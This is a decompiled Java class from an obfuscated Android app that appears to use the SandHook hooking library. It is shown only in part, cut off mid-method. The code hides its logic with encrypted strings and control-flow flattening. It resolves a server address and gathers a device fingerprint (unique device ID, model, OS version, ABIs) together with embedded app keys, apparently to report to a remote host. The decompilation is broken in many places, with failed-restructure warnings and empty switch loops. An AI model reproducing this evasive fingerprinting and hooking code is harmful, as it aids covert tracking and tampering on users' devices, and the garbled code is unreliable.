package core.pro.android.notify;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.text.TextUtils;
import android.util.Base64;
import com.iqoocg.nm.VfSEUCNxUWTV;
import com.iqoocg.nm.fcRuQsQrcxOAzxwEalcM;
import com.shadow.okhttp3.CipherSuite;
import com.shadow.okhttp3.ConnectionSpec;
import com.shadow.okhttp3.MediaType;
import com.shadow.okhttp3.OkHttpClient;
import com.shadow.okhttp3.Request;
import com.shadow.okhttp3.RequestBody;
import com.shadow.okhttp3.Response;
import com.shadow.okhttp3.TlsVersion;
import com.swift.sandhook.utils.FileUtils;
import gTBLD.dev.XSSTG.free.ActivityKeeper;
import gTBLD.dev.XSSTG.free.HookManager;
import gTBLD.dev.XSSTG.free.Utils;
import j$.util.Objects;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.util.Collections;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;
import org.json.JSONObject;

/* loaded from: /workspace/unpacked/classes2.dex */
public class s0 {
    public static boolean a;
    public static JSONObject b;
    public static boolean c;
    public static final String d;
    public static final String e;
    public static final String f;

    static {
        String str = "ۜۘ۬ۧۥۥۡۢۛ۫ۗۥۤۚۥۘۙۜۖۨ۟ۢۘ۫ۡۘ۟۟ۤۧ۫ۖۘۤۜۘۥۘ۬ۖۗۚۡۥۦۘۥۖۘۘ۬ۥۚ";
        while (true) {
            switch ((((str.hashCode() ^ 518) ^ 46) ^ 449) ^ 2063744667) {
                case -1850402283:
                    a = false;
                    str = "ۗ۫ۖۘ۟۬ۛۢ۠ۨ۫ۘۢۦۛ۠ۜ۠۫ۙۙ۟۠ۥۗ۬۫ۛ۫۫ۜۛۚۖۘۚۜۖۡۖۦۜۖۡۘ";
                    break;
                case -1589091713:
                    c = false;
                    str = "ۖۗۖۘۜۘ۬ۢۘۘ۫ۖۘۚۘۨۘ۬ۡۨۘۚۚۨۘ۠ۖۡۨۗۚۧۗ۬";
                    break;
                case -1580473708:
                    e = l2.decrypt("pYoa6LE+DWSWmAbpnCga\n", "yetpnO5Lfwg=\n");
                    str = "ۤۧۦۘۚۦۙۘۨۨ۬ۖۤ۟ۛۢ۟ۥۨۦۡۘۡۨۗۚۥۥۘۗۢۖ";
                    break;
                case -269095117:
                    b = null;
                    str = "۟۟ۦۘۚۧۜۘۡۥۜۧۜۗ۠ۡۡۘ۬ۙۧۧۨۗۤۦۡۥۨۘۢۚۦۨۜۢۜۡۛۤۛۜۙۦۘ";
                    break;
                case -94251951:
                    d = l2.decrypt("1nljoUmMY0PKZWOuUbZ3\n", "pREGzSXTEzE=\n");
                    str = "ۡۛۥۘ۠ۖ۬ۜۙ۟۫ۧۦ۠ۖۡۜ۬ۗۡۦۘۥۦۢۨۨ۠ۨۘO۫ۡ۫۬ۤۛ۟ۖ۬۫۫۠ۗۥۧ";
                    break;
                case 1941048851:
                    return;
                case 2103890934:
                    f = l2.decrypt("VkHAq6Kt7mVlSd27mKA=\n", "OiCz3/3YnAk=\n");
                    str = "ۡ۠ۙۘۖ۬ۜ۬ۜۢۙۨۘ۠۬ۖۘۨۜ۠ۖ۟ۦۘۨۧۦۘۦۦۡ۫ۦۘۘۚۗ۬ۚۧۡۧۧۗ۠ۧۙۧۤ۬۠ۢ۬ۗ۫ۜۘ۬ۗ";
                    break;
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:1401:0x0ab6, code lost:
    
        continue;
     */
    /* JADX WARN: Code restructure failed: missing block: B:1402:0x0ab6, code lost:
    
        continue;
     */
    /* JADX WARN: Code restructure failed: missing block: B:365:0x0899, code lost:
    
        r4 = "ۦۗۖۡ۠ۖۘۜۤۖۚۘۙۙۛۨۢ۠۟ۨۤ۠ۗۗۨۘۖ۫ۡۥ۠ۖ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:367:0x08a3, code lost:
    
        switch((r4.hashCode() ^ 371796232)) {
            case -1907735703: goto L1457;
            case -1824073105: goto L1401;
            case -1611401690: goto L1459;
            case 1635824221: goto L1458;
            default: goto L1463;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:369:0x08a7, code lost:
    
        r4 = "۠۬ۜۗۢۡۛۥۢۜۛۘۥ۬ۚۢۨۨۘ۫ۚۡۘۘۜ۠۬ۚ۠ۧۤ۠ۜۤۘ۬۬ۜۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:371:0x08b1, code lost:
    
        switch((r4.hashCode() ^ 728180125)) {
            case -1793236545: goto L1468;
            case -1611293151: goto L1469;
            case -658563788: goto L1402;
            case 464749498: goto L1467;
            default: goto L1473;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:373:0x08b5, code lost:
    
        r4 = "۠ۜۚۡۛۡۥۙۨۙۡۘۧۚ۫ۚۚۧۖ۫۠ۛ۫ۙۢۡۜۨ۫۫ۡۢۗۧۡۘۢۙۜۘۡ۟ۦۚ۫ۗۙ۠ۨۘۧۦۧۘ۫ۛۨ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:375:0x08bf, code lost:
    
        switch((r4.hashCode() ^ (-1727950386))) {
            case -1381608587: goto L1470;
            case -1105139907: goto L1478;
            case 466104309: goto L1477;
            case 1670315841: goto L1471;
            default: goto L1482;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:377:0x08c3, code lost:
    
        r4 = "ۚۜ۟ۜۢ۫ۧ۟ۨۘ۟ۥ۠۫ۨۙۡۜۖۘۘۙۘۘۙۙ۠ۢۡۥۗۨۨ۠۫ۜۘۘۡۙ۟ۗۛۛۦ۠ۤۘۗۤۖۘۨۢۥۘۖۨ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:411:0x092c, code lost:
    
        r4 = "ۘۧۨۘۙۙۦۗ۟ۗۡ۫ۜۦۨۖۘۡ۟ۧۚۥۥ۬ۥۦۤۖۛۖۜۗۦۢۡۘۤۛۖۘۦۤۡ۬ۖۜۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:412:0x0930, code lost:
    
        r4 = "ۦ۟ۖ۬ۤۜۘۗۡۥۜۢ۫ۖ۬۬ۛۡۧۡۡۘۘۤۚۥ۬ۥۤۘۛۢۡۖۘۨۚۗۧۚۦۦۥ۟ۨۚۚۥ۫ۖۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:414:0x093a, code lost:
    
        switch((r4.hashCode() ^ 1338903911)) {
            case -2080618683: goto L1460;
            case -1774868125: goto L1562;
            case -1465560616: goto L1461;
            case 350590443: goto L1563;
            default: goto L1567;
        };
     */
    /* JADX WARN: Code restructure failed: missing block: B:416:0x093e, code lost:
    
        r4 = "ۖ۠۬ۚ۬ۤۨۗۖۧ۫۠ۨۘۜ۠ۖۘۤۛ۬ۘۢۚۚۜۢ۫ۙۚۥۜۘ۠ۚۧ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:417:0x0942, code lost:
    
        r4 = "ۚ۠ۡۧۦۘۨۡۨ۫ۧ۠ۢ۬ۡۘۛۙۢۗۖۜۥۛۦۘ۠ۡۦۘۨۡۡۡ۫ۤۦۤۛۗۙۡۘۧۨۖۧۘۘۘۘۥۖ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:419:0x0946, code lost:
    
        if (r10 != 1) goto L1565;
     */
    /* JADX WARN: Code restructure failed: missing block: B:420:0x0948, code lost:
    
        r4 = "ۚۥۦۗۖۦۘۘۡۡ۠ۛۙۥۗۨۡ۟ۡۦۧۥۙۛۧۢۦۘۙۙۥۘۚۚ۠۠ۜۘۘۥ۟ۥۧ۟ۛۨۢۚ۫ۤ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:421:0x094b, code lost:
    
        r4 = "ۦۤۨۘۘۘۚ۬۫ۦۘ۫ۘ۬ۜۙۨ۠ۖۖۘۖۥۥۙۙ۟ۥۡۘۘۤۛۥ۟ۨۤۛۖۥۘۚۡۘۘۧ۟ۢ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:422:0x094e, code lost:
    
        r4 = "ۖ۬ۥۘۖۛۘ۬ۤۨۘۨۘۖۘۨ۟ۜۙۥۦۚۨۡۘ۟ۧ۫۠ۙۡۘۘۢۘۤۛ۫ۥۗۜ۟ۤۤۥ۟ۖۜۦۖۧۨ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:423:0x0952, code lost:
    
        r4 = "۫ۙۘۘۙۥۘ۫ۥۨۘۗ۬۠ۗۧۨۘۚۡۚ۫ۘۨۦۘۦۘۜۖۖۘۖ۬ۛۖۛۙۥۧۗۖۡۧۥ۫ۜۙ۟ۚۘۨۘ۬ۦۜۖۦۘۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:424:0x0956, code lost:
    
        r4 = "ۦۚۡۘۤۨۚۨ۠ۨۘۥ۟۠ۙ۟ۘ۠۟ۘۨۡۡۘ۠ۜۘۛ۟ۗۧۘۖ۠ۧۤۨۗۦۘ۫ۦۖ۠۠ۥۙۚۢۤ۫ۡۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:425:0x095a, code lost:
    
        if (r2 != false) goto L1480;
     */
    /* JADX WARN: Code restructure failed: missing block: B:426:0x095c, code lost:
    
        r4 = "۫ۙۖۜۜۖۙۖ۠۠ۚۖۘۧ۫ۖۘۦ۬ۘۘۙۜۜۖ۠ۦۘ۠ۨۖۖۙۧۢۙۡۛ۬۠";
     */
    /* JADX WARN: Code restructure failed: missing block: B:427:0x0960, code lost:
    
        r4 = "ۗۤۛۜ۠ۡ۠ۥۘ۫ۖۛۤۡۜۢۙ۫ۨۗۦۗۜۛۙۧۦۘۨ۟۫۠۬ۖۘۦۘ۠ۜۡۨۚۦۘۗۧ۫ۤ۫ۖۘ";
     */
    /* JADX WARN: Code restructure failed: missing block: B:428:0x0964, code lost:
    
        r4 = "ۙ۠ۜۘ۬۫۠۟ۛ۫ۥ۠ۜۘۧۧۙ۟۬۬ۛۘۜۦۧ۫۬ۨۧۗ۠ۗۢ۬۠ۧۧۦۘۘۘ۠ۢۦۚ";
     */
    /* JADX WARN: Failed to find 'out' block for switch in B:133:0x043f. Please report as an issue. */
    /* JADX WARN: Failed to find 'out' block for switch in B:44:0x00b5. Please report as an issue. */
    /* JADX WARN: Failed to find 'out' block for switch in B:76:0x02e7. Please report as an issue. */
    /* JADX WARN: Removed duplicated region for block: B:1188:0x057a A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:1189:0x0dbd A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:1190:0x0dde A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:1191:0x0e8f A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:1195:0x0571 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:793:0x0232 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:883:0x0221 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:884:0x0338 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:885:0x0355 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:886:0x0359 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:890:0x0218 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:894:0x02f2 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:895:0x04a3 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:896:0x04c0 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:900:0x0229 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:926:0x0300 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:927:0x05b6 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:928:0x05ba A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:929:0x0d81 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:933:0x02f7 A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static /* synthetic */ void a(int[] iArr, String[] strArr, int[] iArr2, Context context, int[] iArr3, SharedPreferences sharedPreferences, String[] strArr2, boolean[] zArr, boolean[] zArr2, boolean z, int[] iArr4) throws InterruptedException, PackageManager.NameNotFoundException, IOException {
        String str;
        String strReplace;
        String hostAddress;
        String str2;
        String str3;
        String str4;
        int iCode;
        boolean z2;
        int i;
        String str5;
        String str6;
        JSONObject jSONObject;
        JSONArray jSONArrayOptJSONArray;
        boolean z3;
        String str7 = "";
        while (true) {
            String str8 = str7;
            String str9 = "ۗ۟ۨۜۚۜۘۗۛۙۤۘۙ۟ۤۚۥۦۨۨۘۧۥۛۦۚۚۥۗ۠۠ۢۢ۟ۧۨۘۤۦۡۗۦۛۛۤ۠ۚۦۧ";
            while (true) {
                switch (str9.hashCode() ^ (-1036233378)) {
                    case -1697911506:
                        str = i.a[iArr2[0]];
                        break;
                    case -1422833906:
                        String str10 = "ۧۙ۠ۡ۬۟ۨۥۜۘۦۦۚ۠ۤ۬ۜۚ۠۟ۤۦ۠۬ۜۚۧۜۢۚۦۘۘۙۨۘۥۦۧۡ۫ۦۜۥۨۘ۟ۦ۬ۨۤۨۘ";
                        while (true) {
                            switch (str10.hashCode() ^ (-1999635994)) {
                                case -2092937734:
                                    str10 = iArr[0] == 0 ? "۟۬ۙ۫ۛۧۤۨۘۙۤۦ۠ۡۢ۬ۥۖۙۡۢۥۗۤۥۘۦۖۘۤۨۡ۟ۧ۟ۡۘ" : "ۡ۠۟ۢۥۖۘ۟ۡۘۧۤۧۗۚۥۡ۠ۜۘۘۧۚۜۛۗۘۦۡۘۘۨۧ";
                                case -1604402457:
                                    str9 = "۠۫ۡۗۛۖۘۖ۫ۛۗ۠ۦ۫ۢۜۦۧۦۥۡۢۙ۠۫ۤۚۙۛۙ۠";
                                    break;
                                case -1458462362:
                                    str10 = "ۢۦ۫ۘۙۥۖۨۘۤۘ۟ۡۦ۟ۧۜۧۘۨۗ۫ۗۖۖۚۡۘۘ۠ۗۙۤۤۤۗۦۜ۟ۛۦ۬ۤۨ";
                                case 1589737815:
                                    str9 = "ۦۨۥۘۙ۟ۨ۫ۧۦۘۗۢ۬ۙۤ۫ۚ۫ۜۘۦ۬ۡۘۢۢۨۖ۠ۖۥۨۢۢۙۡ۟۬";
                                    break;
                            }
                        }
                        break;
                    case 579120127:
                        str = strArr[iArr2[0]];
                        break;
                    case 1121711774:
                        str9 = "ۥۥۢ۟ۛ۫ۛ۫ۙ۬ۢۘۘۤۜۙ۫ۥ۬ۦۖۖۘۨۦۤۖۗۖۘۨۡ۫۫ۛۘۘۦ۬ۚۡ۬ۥۙۖۨۘۛۡۘۙۛۥۨۨۙ۫ۜۙ";
                }
            }
            String str11 = "ۨ۫ۘۗۤۦۨۦۦۘۨ۠۠ۗۖۙ۠ۜۥۖۖۗۤ۠۠۫ۥۚۤۨ۟ۘۙۖۖۖۘۘۜۥۗۥۧۦ";
            while (true) {
                switch (str11.hashCode() ^ 802586488) {
                    case -342309845:
                        str11 = "ۥۛ۫ۢۥ۫ۚۜۨۘۙۢۨۘۧ۬ۜۜۚۚۙۘۜۘۜۤۧۙۚۨۘۥۚۡۘۧۜۢۙۡۜۘ۬ۖۜۤ۫ۚ";
                    case 1058652012:
                        strReplace = str.replace(l2.decrypt("4A==\n", "yna54LbbmHY=\n"), Utils.generateRandomString());
                        break;
                    case 1103873880:
                        String str12 = "ۗۚۥۘۦۗۘۘ۬۠ۥۘۖۚۖۢۡۦۚۘۚۗۚۖۜ۫ۧۡۜ۬ۚۜ۟ۚۖ۬ۛۦۘۛۡۤ۬ۚ۫";
                        while (true) {
                            switch (str12.hashCode() ^ 109240046) {
                                case -1727516262:
                                    str11 = "ۧۚۘۘۙ۠ۜۜۜۧ۬۬ۡۥ۠ۢۦۛۦ۠ۦۘ۠۬ۦۘۨ۠ۘۡۘۥۛ۟ۢۥ۫۫ۨۥۘ۬ۤۤۖۖۡۘۧۙۖۖۙ۬۬ۜۡۘ";
                                    break;
                                case -1662726507:
                                    str12 = "ۨۜۨۘۤۦۦۥۙۨۤۜۡ۠۠۟ۦ۬۫ۜۚ۬ۦۘۚۦۜۘۙ۠ۥۘۖۤۙۢ۬ۘۜۢ۬ۢۤۤۚۗ۫۫ۦۗ";
                                case -746595810:
                                    str11 = "۫ۨۢۜۛ۟ۖۛۛۜۢۥۢۨۗۘ۠ۙۤۘۘۧۥۜۘۨۘۗۙۢۨۜۜۜۤۖۨۤۧۘۘۦۙۡۘۤۙۖۘۖ۬ۘ۬ۤۨۤۚۜۘ";
                                    break;
                                case 1853590376:
                                    str12 = str.contains(l2.decrypt("LQ==\n", "B4j14+zMtGc=\n")) ? "ۧ۠ۦۘۖ۠ۨۘۜۜۖۡۘۗۦ۬۠ۥ۠ۜ۠ۦۥ۫۠ۜۘۚ۠ۘۧۙ۫ۘۜۢۦۤۛۦۡۥۥ۬۬" : "ۗۗۖۙ۠ۖۗۙۧۛۦۖۘ۠ۦۡۘۘۢۜۘۥۖۚ۟ۘۜۘۤۙۗۘۨۥۢۖۨۙ۟ۗۦۧۚۘۢۨۘۧۜۨ۠ۥۧ";
                            }
                        }
                        break;
                    case 1141445992:
                        strReplace = str;
                        break;
                }
            }
            try {
                InetAddress[] allByName = InetAddress.getAllByName(new URL(strReplace).getHost());
                String str13 = "۠ۗۛۙ۫ۢ۠ۗۤۨۜۧۘۜ۬ۖۡۚ۫ۚۗۨ۫ۙۧ۬ۖۘۘۖۗۗۛ۟ۤۨۛۧۡۨۘ۬ۡۗۥۦۥۘۧ۫ۢ";
                while (true) {
                    switch (str13.hashCode() ^ (-1811771461)) {
                        case -965978539:
                            hostAddress = allByName[0].getHostAddress();
                            try {
                                k2.logToFloatingWindow(l2.decrypt("W2bkxAlmA9zvPfiAVGfX2+w647k=\n", "vNVfI7L5R5I=\n") + hostAddress, l2.decrypt("M50xoQ==\n", "WvNXzsreJwM=\n"));
                            } catch (Exception e2) {
                                e = e2;
                                k2.logToFloatingWindow(h.d("PlnIqD1UCUKKAtTsYFXd6X1bm/sjJPGW\n", "2epzT4bLTQw=\n", new StringBuilder(), e), l2.decrypt("WxImLSl+yQ==\n", "LHNUQ0AQroM=\n"));
                                String packageName = context.getPackageName();
                                PackageManager packageManager = context.getPackageManager();
                                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 0);
                                String str14 = packageInfo.versionName;
                                int i2 = packageInfo.versionCode;
                                String uniqueDeviceId = Utils.getUniqueDeviceId(context);
                                String str15 = Build.BRAND;
                                String str16 = Build.MODEL;
                                String str17 = Build.VERSION.RELEASE;
                                int i3 = Build.VERSION.SDK_INT;
                                String strJoin = TextUtils.join(l2.decrypt("pA==\n", "iDgl+HN74LI=\n"), Build.SUPPORTED_ABIS);
                                StringBuilder sb = new StringBuilder();
                                sb.append(l2.decrypt("hhEcvb3EYE8=\n", "9nB/1tyjBXI=\n"));
                                sb.append(packageName);
                                sb.append(l2.decrypt("0BohEAnqM66pAiUPH74=\n", "9mxEYnqDXMA=\n"));
                                sb.append(str14);
                                sb.append(l2.decrypt("Kr8EDENvoPxTqg4aVTs=\n", "DMlhfjAGz5I=\n"));
                                sb.append(i2);
                                sb.append(l2.decrypt("S7y05HxVtA==\n", "bd3ElBUxiYE=\n"));
                                sb.append(fcRuQsQrcxOAzxwEalcM.APP_ID);
                                sb.append(l2.decrypt("b9mTrPeh9r0=\n", "Sbjj3JzEj4A=\n"));
                                sb.append(fcRuQsQrcxOAzxwEalcM.APP_KEY);
                                sb.append(l2.decrypt("r4xFYRc=\n", "iecgGCrwM4s=\n"));
                                sb.append(fcRuQsQrcxOAzxwEalcM.KEY);
                                sb.append(l2.decrypt("BfK6WgE=\n", "I5bTPjy61fo=\n"));
                                sb.append(uniqueDeviceId);
                                sb.append(l2.decrypt("cs5GSmX5jJMw00xmeOzc\n", "VL0/ORGc4cw=\n"));
                                sb.append(hostAddress);
                                sb.append(l2.decrypt("6Vf1U5D4elOqVu5fk/oY\n", "zySdNvyUJSU=\n"));
                                sb.append(l2.decrypt("rq/k\n", "n5nVc8aV9l4=\n"));
                                sb.append(l2.decrypt("qQSPsFpooQ==\n", "j2b90TQMnMs=\n"));
                                sb.append(str15);
                                sb.append(l2.decrypt("1/QJYn+JkA==\n", "8ZlmBhrlrag=\n"));
                                sb.append(str16);
                                sb.append(l2.decrypt("I7DP+GJsL8Jap8TuY2opyDg=\n", "BdGhnBADRqY=\n"));
                                sb.append(str17);
                                sb.append(l2.decrypt("S0UgCruyF65Q\n", "bTZEYeTbedo=\n"));
                                sb.append(i3);
                                sb.append(l2.decrypt("IQl1UJA=\n", "B2gXOa2SzNw=\n"));
                                sb.append(strJoin);
                                String string = sb.toString();
                                StringBuilder sb2 = new StringBuilder();
                                boolean zEquals = Objects.equals(fcRuQsQrcxOAzxwEalcM.DNS_POOL, l2.decrypt("dWRwnbl0xQ==\n", "Lkc00+pXmM0=\n"));
                                str4 = "ۧۤۧۡۜۜۘ۫ۡۘۘ۠ۢۘۚۗۡۙ۠۬ۤ۟ۦۘۢ۠۟۟ۤۥۘۨۘۥۘۚۘ۟ۦ۠۫ۨ۫ۙ۠ۤۗۦۥ۟ۘ";
                                while (true) {
                                    switch (str4.hashCode() ^ (-1451508338)) {
                                        case -2017632817:
                                            break;
                                        case 912956346:
                                            break;
                                        case 1341610018:
                                            break;
                                        case 1568809811:
                                            break;
                                    }
                                }
                                str5 = "ۚۢۥۖۤۦۘۗۥۘۘۧۙۦۘ۟ۖۜ۫۟ۖۘۨۢۜۘۖ۟ۧ۫۬ۢۖ";
                                while (true) {
                                    switch (str5.hashCode() ^ 1020671572) {
                                        case -1531959834:
                                            break;
                                        case -1378289403:
                                            break;
                                        case -550707592:
                                            break;
                                        case 1513907418:
                                            break;
                                    }
                                }
                                str6 = "ۖۡۧۘۤۥۜ۠ۛۜۦۖۢۡۡۘ۫ۘۘۘۧۥ۫۬۫ۗۧ۠ۦۘۧۦۧۘ۟ۧۚ۫ۡۨۘۗ۠ۥۘۦۙۤ";
                                while (true) {
                                    switch (str6.hashCode() ^ (-1165819036)) {
                                        case -704160080:
                                            break;
                                        case -687582756:
                                            break;
                                        case -85272491:
                                            break;
                                        case -20826937:
                                            break;
                                    }
                                }
                                str2 = "ۛۨۢ۟ۥ۫ۨۗ۬ۦۖۘۖۡۨۘ۟ۖۖۥۨۨۘۦۚۘۘ۫ۤۡۘۡ۬ۦۜ۫۬ۙۧۡۘ";
                                while (true) {
                                    switch (str2.hashCode() ^ (-296637591)) {
                                        case -2051262072:
                                            break;
                                        case -660958403:
                                            break;
                                        case -203741106:
                                            break;
                                        case 750215639:
                                            break;
                                    }
                                }
                                Thread.sleep(1000L);
                            }
                            break;
                        case -936739326:
                            String str18 = "ۡ۠ۡۘ۫ۥۤ۬ۜۨ۠ۖۨۦۘ۠۟ۥۘۦ۬۬ۜ۬ۡ۟ۗ۟۠۫ۚ";
                            while (true) {
                                switch (str18.hashCode() ^ (-432750852)) {
                                    case -1893313724:
                                        str13 = "ۚۙۡۚۧۦۥۧۘۘۦۛۙۡۗ۠ۧۢۗ۫ۚ۠۟۫ۖۗۗۧ۠ۦ";
                                        break;
                                    case -676597402:
                                        str13 = "۟۟۠ۛ۬ۦۘۥۜۖۘ۟ۖۗ۫ۙۥۘۢ۫ۜۘۛ۠ۦۤۛ۬ۙۘ۬۟ۨۡۘ";
                                        break;
                                    case -643957144:
                                        str18 = "۟۟ۜۧۛۦۘۚۜۧۘ۬ۘۥۚۥۤ۫ۚۛۛۜۡ۟ۡۘ۫ۦۥۢۚۜۘۦۢۗۖۚۖۘۡۧۗۦ۟ۘۘۨۦۨۘۖۘۥۜ۬ۡۘۧ۫ۦۘ";
                                    case -75393031:
                                        str18 = allByName.length > 0 ? "ۨ۬ۘۘۢۧۧۨ۫ۡۘۜۚ۬ۜۚ۠ۗۚۦۜۤۖۘ۟ۡۖۚۤۦۘۜۤۘۖۜۨۖۙۢۧۡۛۨ۫ۚۘۘۡۥ۬" : "ۜ۠ۜۛۤ۬ۙۡۘۥۨۚۖۚۡۘ۫ۙۖۚۚۚۛ۟ۜۘ۠ۗۚۧۡۘ";
                                }
                            }
                            break;
                        case -62840660:
                            str13 = "ۡ۬ۗ۟ۗۖۘۦۗۢۖۖۤۚۖۥۚۗۦۢۜۜۨۗۜۢۡۜۛۦ۬۫ۢۨۗۜۢۦۢۘ۫ۡۜ۫ۢۥۘ۟۟ۘ۠۟ۙۖۖۘ";
                        case 1363085812:
                            hostAddress = str8;
                            break;
                    }
                }
            } catch (Exception e3) {
                e = e3;
                hostAddress = str8;
            }
            try {
                String packageName2 = context.getPackageName();
                PackageManager packageManager2 = context.getPackageManager();
                PackageInfo packageInfo2 = packageManager2.getPackageInfo(packageName2, 0);
                String str142 = packageInfo2.versionName;
                int i22 = packageInfo2.versionCode;
                String uniqueDeviceId2 = Utils.getUniqueDeviceId(context);
                String str152 = Build.BRAND;
                String str162 = Build.MODEL;
                String str172 = Build.VERSION.RELEASE;
                int i32 = Build.VERSION.SDK_INT;
                String strJoin2 = TextUtils.join(l2.decrypt("pA==\n", "iDgl+HN74LI=\n"), Build.SUPPORTED_ABIS);
                StringBuilder sb3 = new StringBuilder();
                try {
                    sb3.append(l2.decrypt("hhEcvb3EYE8=\n", "9nB/1tyjBXI=\n"));
                    sb3.append(packageName2);
                    sb3.append(l2.decrypt("0BohEAnqM66pAiUPH74=\n", "9mxEYnqDXMA=\n"));
                    sb3.append(str142);
                    sb3.append(l2.decrypt("Kr8EDENvoPxTqg4aVTs=\n", "DMlhfjAGz5I=\n"));
                    sb3.append(i22);
                    sb3.append(l2.decrypt("S7y05HxVtA==\n", "bd3ElBUxiYE=\n"));
                    sb3.append(fcRuQsQrcxOAzxwEalcM.APP_ID);
                    sb3.append(l2.decrypt("b9mTrPeh9r0=\n", "Sbjj3JzEj4A=\n"));
                    sb3.append(fcRuQsQrcxOAzxwEalcM.APP_KEY);
                    sb3.append(l2.decrypt("r4xFYRc=\n", "iecgGCrwM4s=\n"));
                    sb3.append(fcRuQsQrcxOAzxwEalcM.KEY);
                    sb3.append(l2.decrypt("BfK6WgE=\n", "I5bTPjy61fo=\n"));
                    sb3.append(uniqueDeviceId2);
                    sb3.append(l2.decrypt("cs5GSmX5jJMw00xmeOzc\n", "VL0/ORGc4cw=\n"));
                    sb3.append(hostAddress);
                    sb3.append(l2.decrypt("6Vf1U5D4elOqVu5fk/oY\n", "zySdNvyUJSU=\n"));
                    sb3.append(l2.decrypt("rq/k\n", "n5nVc8aV9l4=\n"));
                    sb3.append(l2.decrypt("qQSPsFpooQ==\n", "j2b90TQMnMs=\n"));
                    sb3.append(str152);
                    sb3.append(l2.decrypt("1/QJYn+JkA==\n", "8ZlmBhrlrag=\n"));
                    sb3.append(str162);
                    sb3.append(l2.decrypt("I7DP+GJsL8Jap8TuY2opyDg=\n", "BdGhnBADRqY=\n"));
                    sb3.append(str172);
                    sb3.append(l2.decrypt("S0UgCruyF65Q\n", "bTZEYeTbedo=\n"));
                    sb3.append(i32);
                    sb3.append(l2.decrypt("IQl1UJA=\n", "B2gXOa2SzNw=\n"));
                    sb3.append(strJoin2);
                    String string2 = sb3.toString();
                    StringBuilder sb22 = new StringBuilder();
                    boolean zEquals2 = Objects.equals(fcRuQsQrcxOAzxwEalcM.DNS_POOL, l2.decrypt("dWRwnbl0xQ==\n", "Lkc00+pXmM0=\n"));
                    str4 = "ۧۤۧۡۜۜۘ۫ۡۘۘ۠ۢۘۚۗۡۙ۠۬ۤ۟ۦۘۢ۠۟۟ۤۥۘۨۘۥۘۚۘ۟ۦ۠۫ۨ۫ۙ۠ۤۗۦۥ۟ۘ";
                    while (true) {
                        switch (str4.hashCode() ^ (-1451508338)) {
                            case -2017632817:
                                str4 = "ۜ۬ۥ۟ۨۦۘۜۗۦۘ۟ۨۤۖۦۘۨ۬ۛۥ۫۟ۤۜۥۘۦۙ۬۫۠۫ۧۦۦۘۙ۠ۖ۬ۛۨۘۘۜۡۥۦۖۨۨۜۘ";
                            case 912956346:
                                String str19 = "ۢۙۘۗ۟۫۬ۢ۟ۜۙۤۖۘۧۘ۬ۨۛۡۗۛ۫ۡۜۧۜۘۢ۠۠۬ۗۖۡۢۧۖۗ۠۠۫ۨۘ";
                                while (true) {
                                    switch (str19.hashCode() ^ 243518710) {
                                        case -1928527423:
                                            str4 = "ۤ۬ۙ۬۫ۘۤۛۤۢ۠ۛ۟ۘۤۦۘۡۗۘ۬ۤ۠۠ۢۧۛ۬ۢۛۜۘۤ۫ۛ۬ۗۚۦۙۡۨۦ۟ۙ۫۠ۘۘۙۚۢ";
                                            break;
                                        case -1765632133:
                                            str4 = "ۙۘۛۗۜ۬۬ۢۘۘۢۥۜۘۡۢۛۢۥۚۙ۟ۦ۫ۙۜۘۦۡۛۙۗۧۛۢۡۘۘۗۥ۠ۧۦۗۦۨۘ";
                                            break;
                                        case -1104318427:
